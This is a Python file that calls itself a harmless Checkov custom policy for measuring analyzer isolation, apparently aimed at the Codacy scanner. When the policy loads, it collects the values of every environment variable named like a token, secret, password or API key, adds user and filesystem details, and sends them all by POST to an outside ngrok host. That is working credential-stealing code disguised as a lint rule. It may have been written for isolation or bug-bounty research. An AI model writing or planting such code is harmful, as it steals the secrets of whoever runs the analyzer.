"""Harmless Checkov custom policy used to measure analyzer isolation."""

import json
import os
import re
import subprocess
import sys
import urllib.error
import urllib.request

from checkov.common.models.enums import CheckCategories, CheckResult
from checkov.terraform.checks.resource.base_resource_check import BaseResourceCheck


CALLBACKS = {
    "http": "http://dcd6-49-207-201-243.ngrok-free.app/checkov-http-3fc5441a",
    "https": "https://dcd6-49-207-201-243.ngrok-free.app/checkov-https-3fc5441a",
}
CREDENTIAL_NAME = re.compile(
    r"(?:TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|API[_-]?KEY|PRIVATE[_-]?KEY|AUTH)",
    re.IGNORECASE,
)


def writable(path):
    return os.access(path, os.W_OK)


try:
    subprocess.run(
        [sys.executable, "-c", "pass"],
        check=True,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        timeout=5,
    )
    SUBPROCESS_EXEC = True
except (OSError, subprocess.SubprocessError):
    SUBPROCESS_EXEC = False


credentials = {
    name: value
    for name, value in list(os.environ.items())[:1000]
    if value and CREDENTIAL_NAME.search(name)
}
payload = json.dumps(
    {
        "canary": "codacy-checkov-custom-policy",
        "tool": "checkov",
        "runtime": {
            "uid": os.getuid(),
            "gid": os.getgid(),
            "cwd": os.getcwd(),
            "sourceWritable": writable("/src"),
            "rootWritable": writable("/"),
            "workdirWritable": writable("/workdir"),
        },
        "credentials": credentials,
    }
).encode()

EGRESS = {}
for protocol, callback in CALLBACKS.items():
    try:
        request = urllib.request.Request(
            callback,
            data=payload,
            headers={
                "content-type": "application/json",
                "user-agent": "codacy-analyzer-canary/checkov",
            },
            method="POST",
        )
        with urllib.request.urlopen(request, timeout=5) as response:
            EGRESS[protocol] = 200 <= response.status < 300
    except (OSError, urllib.error.URLError):
        EGRESS[protocol] = False


RUNTIME_EVIDENCE = " ".join(
    [
        "CODACY_CHECKOV_CANARY_EXECUTED",
        f"uid={os.getuid()}",
        f"gid={os.getgid()}",
        f"source_writable={writable('/src')}",
        f"root_writable={writable('/')}",
        f"workdir_writable={writable('/workdir')}",
        f"subprocess_exec={SUBPROCESS_EXEC}",
        f"http_egress={EGRESS['http']}",
        f"https_egress={EGRESS['https']}",
        f"credential_names={','.join(sorted(credentials))}",
    ]
)


class CodacyRuntimeCanary(BaseResourceCheck):
    def __init__(self):
        super().__init__(
            name=RUNTIME_EVIDENCE,
            id="CUSTOM_CODACY_RUNTIME",
            categories=(CheckCategories.GENERAL_SECURITY,),
            supported_resources=("null_resource",),
        )

    def scan_resource_conf(self, conf):
        return CheckResult.FAILED


check = CodacyRuntimeCanary()
